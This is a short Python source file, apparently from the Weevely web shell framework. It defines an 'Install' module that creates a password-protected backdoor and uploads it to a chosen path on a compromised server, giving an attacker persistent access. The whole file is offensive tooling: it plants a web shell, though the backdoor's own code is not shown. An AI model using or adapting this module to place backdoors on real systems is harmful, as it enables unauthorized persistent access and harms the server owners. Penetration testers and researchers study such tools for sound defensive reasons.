'''
Created on 28/ago/2011

@author: norby
'''

'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.backdoor import Backdoor

classname = 'Install'
    
class Install(Module):
    """Install another Weevely backdoor 
    :backdoor.install <password> <remote path>
    """
    
    def run(self, password, remote_path):

        backdoor = Backdoor(password)
        self.modhandler.load('file.upload').run('', remote_path, file_content = str(backdoor))
        
           
    